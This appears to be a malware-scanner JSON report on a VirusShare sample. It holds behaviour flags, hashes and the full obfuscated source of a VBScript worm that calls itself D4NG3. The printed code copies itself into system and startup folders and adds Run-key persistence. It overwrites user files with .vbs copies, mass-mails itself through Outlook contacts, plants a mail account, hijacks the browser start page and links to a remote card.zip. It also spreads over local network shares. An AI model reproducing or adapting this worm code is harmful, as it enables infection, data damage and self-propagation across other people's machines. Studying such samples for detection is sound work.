{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Run": "May run an executable file or a system command",
            "SendKeys": "May control another application by simulating user keystrokes",
            "System": "May run an executable file or a system command on a Mac",
            "Windows": "May enumerate application windows",
            "copyfile": "May copy a file",
            "regread": "May read registry keys",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file",
            "wscript.shell": "May run an executable file or a system command"
        },
        "macro": "Set VF = CreateObject(\"Scripting.FileSystemObject\")\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nexecute \"set file = fso.Op\"&\"enTe\"&\"xtFile(WSc\"&\"ript.ScriptF\"&\namp;\namp;\"ullname,1)\"\nexecute \"fso.Ge\"\"tFi\"\"le(WSc\"&\"ript.Scr\"&\"ipt\n\nFu\"&\"llName).Co\"&\"py(\"\"C:\\MyPhoto.JPG.VBS\"\")\"\nexecute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\nexecute \"fso.Ge\"\"tFi\"\"le(WSc\"&\"ript.Scr\"&\"ipt\n\nFu\"&\"llName).Co\"&\"py(gfol & \"\"\\D4NG3.vbs\"\")\"\nexecute \"fso.GetFile(WScript.ScriptFullName).Copy(gfol & \"\"\\D4NG3.vbs\"\")\"\nvbscopy=file.ReadAll\n\nIf VF.FileExists(\"C:\\No.txt\") Then\nelse\nmain()\nWAB()\nDData()\nReg()\nA()\nClone_2()\nOLE()\nmake()\nshare()\nwal()\nIf VF.FileExists(\"C:\\0f.txt\") Then\nelse\nMailMe()\nEnd if\nFunction Reg()\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nexecute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\nFilePath = gfol & \"\\D4NG3.vbs\"\nSet Ws = createobject(\"wscript.shell\")\nWs.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinMine\", FilePath\nEnd Function\n\nFunction MailMe()\nOn Error Resume Next\nDim x\nexecute \"Set ol=Cr\"&\"ea\"&\"teOb\"&\"je\"&\"ct((\"&a\nmp;q\nuot;O\"&\"ut\"&\"lo\"&\"ok.Ap\"&\"p\"&\namp;\namp;\"lic\"&\"at\"&\"io\"&\"n\"\"))\"\nFor x=1 To 50\ny = 1\nEmail = \"C:\\Modifiche.xls\"\nexecute \"Set Ma\"&\"il=ol.Crea\"&\"teI\"&\"tem(\"&\"0\"&\")\"\n\n\nexecute \"Ma\"&\"il.t\"&\"o=ol.Ge\"&\"tNa\"&\"meSp\"&\"ace(\"\"MA\"&am\np;am\np;\"PI\"\").Ad\"&\"dressLi\"&\"sts(\"&\"1&\namp;\nquot;&\").Add\"&\"res\"&\"sEnt\"&\"ries\"&\namp;\namp;\"(\"&\"x\"&\")\"\nexecute \"Ma\"&\"il.Su\"&\"bje\"&\"ct=\"\"Modif\"&\"iche...\"\"\"\nexecute \"Ma\"&\"il.B\"&\"od\"&\"y=\"\"\"\"\"\nexecute \"set Allega =Mail.\" & \"Attac\" & \"hments\"\nexecute \"All\"&\"ega.A\"&\"dd(Em\"&\"ail)\"\nIf Mail.to <> \"\" Then\nexecute \"Ma\"&\"il.Se\"&\"nd\"\nElse\ni = i + 1\nEnd if\nNext\nol.Quit\nEnd Function\n\nFunction A()\nfolderlist(\"\\\")\nlistadriv = s\nEnd Function\nsub inf(folderspec)\nOn Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n dim f,f1,fc,ext,ap,s,bname,mp3\nexecute \"set f = fso.\" & \"Get\" & \"Folder\" & \"(folderspec)\"\n set fc = f.Files\n for each f1 in fc\n  ext = fso.GetExtensionName(f1.path)\n  ext = lcase(ext)\n  s = lcase(f1.name)\nif(ext=\"jpg\") or (ext=\"jpeg\") or (ext=\"dwg\") or (ext=\"bak\") or (ext=\"doc\") or (ext=\"html\") or (ext=\"xls\") or (ext=\"mdb\") or (ext=\"txt\") or (ext=\"mp3\") or (ext=\"gif\") or (ext=\"png\") or (ext=\"htm\") then\nif (f1.name=\"wallPaper.html\") or (f1.name=\"untitled.HTM\") then\nelse\n  set Afiles = fso.CreateTextFile(f1.path & \".vbs\")\n  Afiles.write vbscopy\n  Afiles.close\n  set att = fso.GetFile(f1.path)\n  att.attributes = att.attributes + 2\nend if\nend if\nNext\nEnd Sub\nsub folderlist(folderspec)  \ndim f,f1,sf\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nexecute \"set f = fso.\" & \"Get\" & \"Folder\" & \"(folderspec)\"\nexecute \"set sf = f.\" & \"Sub\" & \"Folders\"\n for each f1 in sf\n   inf(f1.path)\n   folderlist(f1.path)\n next  \nend sub\nFunction DData()\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet tf = fso.CreateTextFile(\"c:\\System.dat.vbs\", True)\ntf.WriteLine(\"If day(now) = 10 then\")\ntf.WriteBlankLines(1)\ntf.Write (\"MsgBox \"&\"\"\"\"&\"YOU ARE SHIT!!!. :o)\"&\"\"\"\"&\",64,\"&\"\"\"\"&am\np;am\np;\":o)\"&\"\"\"\")\ntf.WriteBlankLines(1)\ntf.Write (\"end if\")\ntf.WriteBlankLines(1)\ntf.Close\nDataReg()\nEnd Function\nFunction DataReg()\nFilePath2 = \"c:\\System.dat.vbs\"\nSet Ws = createobject(\"wscript.shell\")\nWs.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Data\", FilePath2\nEnd Function\nFunction Clone_2()\nSet fso = createobject(\"scripting.filesystemobject\")\nexecute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\nSet tf = fso.CreateTextFile(gfol&\"\\BasicUpdate.dll.vbs\", True)\ntf.Write (\"On Error Resume Next\")\ntf.WriteBlankLines(1)\ntf.Write (\"Do\")\ntf.WriteBlankLines(1)\ntf.Write (\"Set regedit = CreateObject(\"&Chr(34)&\"WScript.Shell\"&Chr(34)&\")\"\n;\n\ntf.WriteBlankLines(1)\ntf.Write (\"regedit.RegWrite \"&Chr(34)&\"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\"&Chr(34)&\", \"&Chr(34)&\"http://www.sesso.com\"&Chr(34)&\"\")\ntf.WriteBlankLines(1)\ntf.Write (\"Loop\")\ntf.WriteBlankLines(1)\ntf.Close\nFilePathA = gfol&\"\\BasicUpdate.dll.vbs\"\nSet Ws = createobject(\"wscript.shell\")\nWs.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSetBrowser\", FilePathA\nEnd Function\nFunction OLE()\nSet fso = createobject(\"scripting.filesystemobject\")\nexecute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\nSet tf = fso.CreateTextFile(gfol&\"\\wallPaper.html\", True)\ntf.Write (\"<html>\")\ntf.WriteBlankLines(1)\ntf.Write (\"<center>\")\ntf.WriteBlankLines(1)\ntf.Write (\"<br><br><br><br><br><br><font size='5'>Smile error:</font><font size='10'><br>Hello!!!<br></font><font size='50'>:o)</font><br><br><center>Infected by D4NG3 <br><font color=red>tf.WriteBlankLines(1)\ntf.Write (\"</center>\")\ntf.WriteBlankLines(1)\ntf.Write (\"<center><b>14/04/2003</b></center>\")\ntf.WriteBlankLines(1)\ntf.Write (\"</html>\")\ntf.Close\nbgfile = gfol&\"\\wallPaper.html\"\nSet Ws = createobject(\"wscript.shell\")\nWs.regwrite \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", bgfile\noeid = Ws.regread(\"HKEY_CURRENT_USER\\Identities\\Default User ID\")\nSet fso = createobject(\"scripting.filesystemobject\")\nexecute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\nSet tf = fso.CreateTextFile(gfol&\"\\index.html\", True)\ntf.Write (vbscopy)\ntf.WriteBlankLines(1)\ntf.Close\nbfnt = gfol&\"\\untitled.HTM\"\noe = \"HKEY_CURRENT_USER\\Identities\\\" & oeid & \"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail\"\nMSH = oe & \"\\Message Send HTML\"\nCUS = oe & \"\\Compose Use Stationery\"\nSN = oe & \"\\Stationery Name\"\nWSN = oe & \"\\Wide Stationery Name\"\nWs.regwrite MSH, 1\nWs.regwrite CUS, 1\nWs.regwrite SN, bfnt\nWs.regwrite WSN, bfnt\nEnd Function\nFunction make()\n set fso = CreateObject(\"Scripting.FileSystemObject\")\n execute \"win = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"\n set b=fso.CreateTextFile(win & \"\\untitled.HTM\")\n b.close\nexecute \" b\"&\"h\"&\"t\"&\"m\"&\"l\"&\" = \"\"h\"&\"t\"&\"t\"&\"p\"&\":\"&\"/\"&\"/\"&\"w\"&\"w\"&\"w.com\"&\"una\"&&\namp;\nquot;lan\"&\"driano.\"&\"it/ca\"&\"rd.zip\"\"\"\n set d=fso.OpenTextFile(win & \"\\untitled.HTM\",2)\n d.write \"<HTML>\"\n d.WriteBlankLines(1)\n d.write \"<HEAD>\"\n d.WriteBlankLines(1)\n d.write \"<Title>  </Title></HEAD>\"\n d.WriteBlankLines(1)\n d.write \"<Body>\"\n d.WriteBlankLines(1)\n d.write \"<script>document.write(\"\"<br><br><center><a href='\" & bhtml & \"'><br>View your card...<br>Vedi la cartolina...</a></center>\"\");</SCRIPT>\"\n d.WriteBlankLines(1)\n d.write \"</Body>\"\n d.WriteBlankLines(1)\n d.write \"</HTML>\"\n d.WriteBlankLines(1)\n d.write vbcrlf\n d.close\nEnd Function\nFunction wal()\nSet Ws = createobject(\"wscript.shell\")\nbgfile = gfol&\"\\wallPaper.html\"\nwalo = Ws.regread(\"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\")\nIF bgfile <> walo then\nbgfile = gfol&\"\\wallPaper.html\"\nSet Ws = createobject(\"wscript.shell\")\nWs.regwrite \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", bgfile\nEnd If\nEnd Function\n\nFunction WAB()\nSet Ws = createobject(\"wscript.shell\")\nolk = \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\WAB4\"\nAz = olk & \"\\OlkContactRefresh\"\nBz = olk & \"\\OlkFolderRefresh\"\nCz = olk & \"\\FirstRun\"\nDz = olk & \"\\UseOutlook\"\nWs.regwrite Az, 0, \"REG_DWORD\"\nWs.regwrite Bz, 0, \"REG_DWORD\"\nWs.regwrite Cz, 1, \"REG_DWORD\"\nWs.regwrite Dz, 1, \"REG_DWORD\"\nEnd Function\n\nfunction main()\nOn Error Resume Next\ndata1 = \"Windows Registry Editor Version 5.00\"&vbcrlf& \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts\\00000001]\"&vbcrlf& \">=?Account Name>=?=>=?mail.supereva.it>=?\"&vbcrlf& \">=?Connection Type>=?=dword:00000000\"&vbcrlf& \">=?Make Available Offline>=?=dword:00000001\"&vbcrlf& \">=?IMAP Port>=?=dword:0000008f\"&vbcrlf& \">=?IMAP Timeout>=?=dword:0000003c\"&vbcrlf& \">=?IMAP Use LSUB>=?=dword:00000001\"&vbcrlf& \">=?IMAP Polling>=?=dword:00000001\"&vbcrlf& \">=?IMAP Svr-side Special Folders>=?=dword:00000001\"&vbcrlf& \">=?IMAP Sent Items Folder>=?=>=?Posta inviata>=?\"&vbcrlf& \">=?IMAP Drafts Folder>=?=>=?Bozze>=?\"&vbcrlf& \">=?IMAP Prompt for Password>=?=dword:00000000\"&vbcrlf& \">=?IMAP Dirty>=?=dword:00000000\"&vbcrlf& \">=?IMAP Poll All Folders>=?=dword:00000001\"&vbcrlf& \">=?HTTPMail Prompt for Password>=?=dword:00000000\"&vbcrlf& \">=?HTTPMail Polling>=?=dword:00000001\"&vbcrlf& \">=?ShowAdBar>=?=dword:00000001\"&vbcrlf& \">=?POP3 Server>=?=>=?mail.supereva.it>=?\"&vbcrlf& \">=?POP3 User Name>=?=>=?mp3free1>=?\"&vbcrlf& \">=?POP3 Password2>=?=hex:01,02,6d,00,61,00,69,00,6c,00,2e,00,73,00,75,00,70,00,65,\\\"&vbcrlf& \"  00,72,00,65,00,76,00,61,00,2e,00,69,00,74,00,34,00,42,00,44,00,37,00,31,00,\\\"&vbcrlf& \"  46,00,45,00,30,00,00,00\"&vbcrlf& \">=?POP3 Use Sicily>=?=dword:00000000\"&vbcrlf& \">=?POP3 Port>=?=dword:0000006e\"&vbcrlf& \">=?POP3 Timeout>=?=dword:0000003c\"&vbcrlf& \">=?POP3 Skip Account>=?=dword:00000001\"&vbcrlf& \">=?POP3 Prompt for Password>=?=dword:00000000\"&vbcrlf& \">=?SMTP Server>=?=>=?mail.supereva.it>=?\"&vbcrlf& \">=?SMTP Port>=?=dword:00000019\"&vbcrlf& \">=?SMTP Timeout>=?=dword:0000003c\"&vbcrlf& \">=?SMTP Display Name>=?=>=?ss dd>=?\"&vbcrlf& \">=?SMTP Email Address>=?=>=?mp3free1@supereva.it>=?\"&vbcrlf& \">=?SMTP Split Messages>=?=dword:00000000\"&vbcrlf& \">=?SMTP Split Message Size>=?=dword:00000040\"&vbcrlf& \">=?=?SMTP Prompt for Password>=?=dword:00000000\"\n\n dt1 = replace(data1, chr(62) & chr(61) & chr(63), \"\"\"\")\n Set fso = createobject(\"scripting.filesystemobject\")\n set b=fso.CreateTextFile(\"C:\\small.reg\")\n b.close\n set d=fso.OpenTextFile(\"C:\\small.reg\",2)\n d.Write dt1\n d.close\n\n Set Shell = WScript.CreateObject(\"WScript.Shell\")\n Shell.Run \"c:\\small.reg\", 1\n Set Shell = Nothing\n Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n WScript.Sleep 200\n WshShell.SendKeys \"{ENTER}\"\n WScript.Sleep 200\n WshShell.SendKeys \"{ENTER}\"\n WScript.Sleep 100\n Set keyr = fso.GetFile(\"c:\\small.reg\")\n keyr.Delete\nend function\n\nFunction share()\nOn Error Resume Next\nset wshnetwork = wscript.createobject(\"wscript.network\")\nConst OpenAsDefault    = -2\nConst FailIfNotExist   =  0\nConst ForReading       =  1\nfor ap = 192 to 255\nfor bp = 168 to 255\nfor cp = 0 to 255\nfor dp = 0 to 255\nx = \".\"\nsHost = ap & x & bp & x & cp & x & dp\nSet oShell = CreateObject(\"WScript.Shell\")\nSet oFSO = CreateObject(\"Scripting.FileSystemObject\")\nsTemp = \"C:\"\nsTempFile = sTemp & \"\\netlog.tmp\"\noShell.Run \"%comspec% /c ping -n 1 \" & sHost & \">\" & sTempFile, 0 , True\nSet fFile = oFSO.OpenTextFile(sTempFile, ForReading, FailIfNotExist, OpenAsDefault)\nSet fso = CreateObject(\"scripting.filesystemobject\")\nSet r = fso.opentextfile(\"C:\\netlog.tmp\")\nbuff = \"\"\nfor az = 0 to 3\nbuff = r.readline\nnext\nbuff2 = InStr(buff,\"TTL=\")\nif buff2 <> \"0\" then\nCall registra(sHost)\nend if\nnext\nnext\nnext\nnext\nEnd Function\n\nFunction registra(computer)\nset wshnetwork = wscript.createobject(\"wscript.network\")\nsharename = \"\\\\\" & computer &\"\\C\"\nwshnetwork.mapnetworkdrive \"j:\", sharename\nexecute = \"fso.copyfile WSc\"&\"ript.Scrip\"&\"tFul\"&\"lname, \"&Chr(34)&\"j:\\netlog.vbs\"&Chr(34)\nIf (fso.FileExists(\"j:\\netlog.vbs\")) Then\nSet WshShell = Wscript.CreateObject(\"Wscript.Shell\")\nexecute \"sup = WshShell.Sp\"&\"ecia\"&\"lFol\"&\"ders(\" & Chr(34) & \"AllUsersStartup\" & Chr(34) & \")\"\nexecute = \"fso.copyfile WSc\"&\"ript.Script\"&\"Ful\"&\"lname, \" & sup & \"\\\"\nexecute = \"fso.copyfile WSc\"&\"ript.Script\"&\"Ful\"&\"lname, \"&Chr(34)&\"j:\\W\"&\"I\"&\"N\"&\"D\"&\"O\"&&am\np;qu\not;W\"&\"S\\Men\"&\"u Av\"&\"vio\\Prog\"&\"rammi\\Es\"&\"ec\"&\"uzi\"&\"on\"&\"e au\"&\"tom\"&\"at\"&\"ica\\\"&Chr(34)\nexecute = \"fs\"&\"o.co\"&\"pyfile WScrip\"&\"t.Script\"&\"Ful\"&\"lname, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am\np;qu\not;w\"&\"s\\st\"&\"artm~1\\prog\"&\"rams\\st\"&\"artup\\\"&Chr(34)\nexecute = \"fso.copyfile WScript.ScriptFu\"&\"lln\"&\"ame, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am\np;qu\not;w\"&\"s\\\"&Chr(34)\nexecute = \"fs\"&\"o.copyfil\"&\"e WScript.Scr\"&\"iptF\"&\"ull\"&\"name, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"d\"&\"o\"&&am\np;qu\not;w\"&\"s\"&\"\\\"&\"s\"&\"t\"&\"a\"&\"r\"&&\n;quo\nt;t \"&\"m\"&\"en\"&\"u\\pro\"&\"gra\"&\"ms\\st\"&\"ar\"&\"tu\"&\"p\\\"&Chr(34)\nexecute = \"fso.cop\"&\"yfile WScr\"&\"ipt.Scr\"&\"iptF\"&\"ulln\"&\"ame\n\n, \"&Chr(34)&\"j:\\w\"&\"i\"&\"n\"&\"9\"&\"5\"&&am\np;qu\not;\\\"&\"s\"&\"t\"&\"a\"&\"rt m\"&\"e\"&\"nu\\pr\"&\"o\"&\"gr\"&\"a\"&\"ms\\s\"&\"ta\"&\"r\"&\"tu\"&\"p\\\"&Chr(34)\nEnd If \nwshnetwork.removenetworkdrive \"j:\"\nEnd function\n\nEnd if"
    },
    "filename": "VirusShare_4329b7bde1ae9e9ce9e5cabbdb07cc01",
    "filesize": 12228,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "4329b7bde1ae9e9ce9e5cabbdb07cc01",
        "sha1": "91fa0a293693f63dc7f0aa42061239d0cc2f7e07",
        "sha256": "65953f59b4df662f9f183f26c59080b1733c62604c48dfc690e6a79034006c6f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Set VF = CreateObject(\"Scripting.FileSystemObject\")",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "execute \"set file = fso.Op\"&\"enTe\"&\"xtFile(WSc\"&\"ript.ScriptF\"&",
            "amp;",
            "amp;\"ullname,1)\"",
            "execute \"fso.Ge\"\"tFi\"\"le(WSc\"&\"ript.Scr\"&\"ipt",
            "Fu\"&\"llName).Co\"&\"py(\"\"C:\\MyPhoto.JPG.VBS\"\")\"",
            "execute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            "execute \"fso.Ge\"\"tFi\"\"le(WSc\"&\"ript.Scr\"&\"ipt",
            "Fu\"&\"llName).Co\"&\"py(gfol & \"\"\\D4NG3.vbs\"\")\"",
            "execute \"fso.GetFile(WScript.ScriptFullName).Copy(gfol & \"\"\\D4NG3.vbs\"\")\"",
            "vbscopy=file.ReadAll",
            "If VF.FileExists(\"C:\\No.txt\") Then",
            "else",
            "main()",
            "WAB()",
            "DData()",
            "Reg()",
            "Clone_2()",
            "OLE()",
            "make()",
            "share()",
            "wal()",
            "If VF.FileExists(\"C:\\0f.txt\") Then",
            "else",
            "MailMe()",
            "End if",
            "Function Reg()",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "execute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            "FilePath = gfol & \"\\D4NG3.vbs\"",
            "Set Ws = createobject(\"wscript.shell\")",
            "Ws.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinMine\", FilePath",
            "End Function",
            "Function MailMe()",
            "On Error Resume Next",
            "Dim x",
            "execute \"Set ol=Cr\"&\"ea\"&\"teOb\"&\"je\"&\"ct((\"&a",
            "mp;q",
            "uot;O\"&\"ut\"&\"lo\"&\"ok.Ap\"&\"p\"&",
            "amp;",
            "amp;\"lic\"&\"at\"&\"io\"&\"n\"\"))\"",
            "For x=1 To 50",
            "y = 1",
            "Email = \"C:\\Modifiche.xls\"",
            "execute \"Set Ma\"&\"il=ol.Crea\"&\"teI\"&\"tem(\"&\"0\"&\")\"",
            "execute \"Ma\"&\"il.t\"&\"o=ol.Ge\"&\"tNa\"&\"meSp\"&\"ace(\"\"MA\"&am",
            "p;am",
            "p;\"PI\"\").Ad\"&\"dressLi\"&\"sts(\"&\"1&",
            "amp;",
            "quot;&\").Add\"&\"res\"&\"sEnt\"&\"ries\"&",
            "amp;",
            "amp;\"(\"&\"x\"&\")\"",
            "execute \"Ma\"&\"il.Su\"&\"bje\"&\"ct=\"\"Modif\"&\"iche...\"\"\"",
            "execute \"Ma\"&\"il.B\"&\"od\"&\"y=\"\"\"\"\"",
            "execute \"set Allega =Mail.\" & \"Attac\" & \"hments\"",
            "execute \"All\"&\"ega.A\"&\"dd(Em\"&\"ail)\"",
            "If Mail.to <> \"\" Then",
            "execute \"Ma\"&\"il.Se\"&\"nd\"",
            "Else",
            "i = i + 1",
            "End if",
            "Next",
            "ol.Quit",
            "End Function",
            "Function A()",
            "folderlist(\"\\\")",
            "listadriv = s",
            "End Function",
            "sub inf(folderspec)",
            "On Error Resume Next",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            " dim f,f1,fc,ext,ap,s,bname,mp3",
            "execute \"set f = fso.\" & \"Get\" & \"Folder\" & \"(folderspec)\"",
            " set fc = f.Files",
            " for each f1 in fc",
            "  ext = fso.GetExtensionName(f1.path)",
            "  ext = lcase(ext)",
            "  s = lcase(f1.name)",
            "if(ext=\"jpg\") or (ext=\"jpeg\") or (ext=\"dwg\") or (ext=\"bak\") or (ext=\"doc\") or (ext=\"html\") or (ext=\"xls\") or (ext=\"mdb\") or (ext=\"txt\") or (ext=\"mp3\") or (ext=\"gif\") or (ext=\"png\") or (ext=\"htm\") then",
            "if (f1.name=\"wallPaper.html\") or (f1.name=\"untitled.HTM\") then",
            "else",
            "  set Afiles = fso.CreateTextFile(f1.path & \".vbs\")",
            "  Afiles.write vbscopy",
            "  Afiles.close",
            "  set att = fso.GetFile(f1.path)",
            "  att.attributes = att.attributes + 2",
            "end if",
            "end if",
            "Next",
            "End Sub",
            "sub folderlist(folderspec)  ",
            "dim f,f1,sf",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "execute \"set f = fso.\" & \"Get\" & \"Folder\" & \"(folderspec)\"",
            "execute \"set sf = f.\" & \"Sub\" & \"Folders\"",
            " for each f1 in sf",
            "   inf(f1.path)",
            "   folderlist(f1.path)",
            " next  ",
            "end sub",
            "Function DData()",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set tf = fso.CreateTextFile(\"c:\\System.dat.vbs\", True)",
            "tf.WriteLine(\"If day(now) = 10 then\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"MsgBox \"&\"\"\"\"&\"YOU ARE SHIT!!!. :o)\"&\"\"\"\"&\",64,\"&\"\"\"\"&am",
            "p;am",
            "p;\":o)\"&\"\"\"\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"end if\")",
            "tf.WriteBlankLines(1)",
            "tf.Close",
            "DataReg()",
            "End Function",
            "Function DataReg()",
            "FilePath2 = \"c:\\System.dat.vbs\"",
            "Set Ws = createobject(\"wscript.shell\")",
            "Ws.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Data\", FilePath2",
            "End Function",
            "Function Clone_2()",
            "Set fso = createobject(\"scripting.filesystemobject\")",
            "execute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            "Set tf = fso.CreateTextFile(gfol&\"\\BasicUpdate.dll.vbs\", True)",
            "tf.Write (\"On Error Resume Next\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"Do\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"Set regedit = CreateObject(\"&Chr(34)&\"WScript.Shell\"&Chr(34)&\")\"",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"regedit.RegWrite \"&Chr(34)&\"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page\"&Chr(34)&\", \"&Chr(34)&\"http://www.sesso.com\"&Chr(34)&\"\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"Loop\")",
            "tf.WriteBlankLines(1)",
            "tf.Close",
            "FilePathA = gfol&\"\\BasicUpdate.dll.vbs\"",
            "Set Ws = createobject(\"wscript.shell\")",
            "Ws.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSetBrowser\", FilePathA",
            "End Function",
            "Function OLE()",
            "Set fso = createobject(\"scripting.filesystemobject\")",
            "execute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            "Set tf = fso.CreateTextFile(gfol&\"\\wallPaper.html\", True)",
            "tf.Write (\"<html>\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"<center>\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"<br><br><br><br><br><br><font size='5'>Smile error:</font><font size='10'><br>Hello!!!<br></font><font size='50'>:o)</font><br><br><center>Infected by D4NG3 <br><font color=red>tf.WriteBlankLines(1)",
            "tf.Write (\"</center>\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"<center><b>14/04/2003</b></center>\")",
            "tf.WriteBlankLines(1)",
            "tf.Write (\"</html>\")",
            "tf.Close",
            "bgfile = gfol&\"\\wallPaper.html\"",
            "Set Ws = createobject(\"wscript.shell\")",
            "Ws.regwrite \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", bgfile",
            "oeid = Ws.regread(\"HKEY_CURRENT_USER\\Identities\\Default User ID\")",
            "Set fso = createobject(\"scripting.filesystemobject\")",
            "execute \"gfol = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            "Set tf = fso.CreateTextFile(gfol&\"\\index.html\", True)",
            "tf.Write (vbscopy)",
            "tf.WriteBlankLines(1)",
            "tf.Close",
            "bfnt = gfol&\"\\untitled.HTM\"",
            "oe = \"HKEY_CURRENT_USER\\Identities\\\" & oeid & \"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail\"",
            "MSH = oe & \"\\Message Send HTML\"",
            "CUS = oe & \"\\Compose Use Stationery\"",
            "SN = oe & \"\\Stationery Name\"",
            "WSN = oe & \"\\Wide Stationery Name\"",
            "Ws.regwrite MSH, 1",
            "Ws.regwrite CUS, 1",
            "Ws.regwrite SN, bfnt",
            "Ws.regwrite WSN, bfnt",
            "End Function",
            "Function make()",
            " set fso = CreateObject(\"Scripting.FileSystemObject\")",
            " execute \"win = f\"&\"so.ge\"&\"tspecial\"&\"folder(0)\"",
            " set b=fso.CreateTextFile(win & \"\\untitled.HTM\")",
            " b.close",
            "execute \" b\"&\"h\"&\"t\"&\"m\"&\"l\"&\" = \"\"h\"&\"t\"&\"t\"&\"p\"&\":\"&\"/\"&\"/\"&\"w\"&\"w\"&\"w.com\"&\"una\"&&",
            "amp;",
            "quot;lan\"&\"driano.\"&\"it/ca\"&\"rd.zip\"\"\"",
            " set d=fso.OpenTextFile(win & \"\\untitled.HTM\",2)",
            " d.write \"<HTML>\"",
            " d.WriteBlankLines(1)",
            " d.write \"<HEAD>\"",
            " d.WriteBlankLines(1)",
            " d.write \"<Title>  </Title></HEAD>\"",
            " d.WriteBlankLines(1)",
            " d.write \"<Body>\"",
            " d.WriteBlankLines(1)",
            " d.write \"<script>document.write(\"\"<br><br><center><a href='\" & bhtml & \"'><br>View your card...<br>Vedi la cartolina...</a></center>\"\");</SCRIPT>\"",
            " d.WriteBlankLines(1)",
            " d.write \"</Body>\"",
            " d.WriteBlankLines(1)",
            " d.write \"</HTML>\"",
            " d.WriteBlankLines(1)",
            " d.write vbcrlf",
            " d.close",
            "End Function",
            "Function wal()",
            "Set Ws = createobject(\"wscript.shell\")",
            "bgfile = gfol&\"\\wallPaper.html\"",
            "walo = Ws.regread(\"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\")",
            "IF bgfile <> walo then",
            "bgfile = gfol&\"\\wallPaper.html\"",
            "Set Ws = createobject(\"wscript.shell\")",
            "Ws.regwrite \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", bgfile",
            "End If",
            "End Function",
            "Function WAB()",
            "Set Ws = createobject(\"wscript.shell\")",
            "olk = \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\WAB4\"",
            "Az = olk & \"\\OlkContactRefresh\"",
            "Bz = olk & \"\\OlkFolderRefresh\"",
            "Cz = olk & \"\\FirstRun\"",
            "Dz = olk & \"\\UseOutlook\"",
            "Ws.regwrite Az, 0, \"REG_DWORD\"",
            "Ws.regwrite Bz, 0, \"REG_DWORD\"",
            "Ws.regwrite Cz, 1, \"REG_DWORD\"",
            "Ws.regwrite Dz, 1, \"REG_DWORD\"",
            "End Function",
            "function main()",
            "On Error Resume Next",
            "data1 = \"Windows Registry Editor Version 5.00\"&vbcrlf& _",
            "\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts\\00000001]\"&vbcrlf& _",
            "\">=?Account Name>=?=>=?mail.supereva.it>=?\"&vbcrlf& _",
            "\">=?Connection Type>=?=dword:00000000\"&vbcrlf& _",
            "\">=?Make Available Offline>=?=dword:00000001\"&vbcrlf& _",
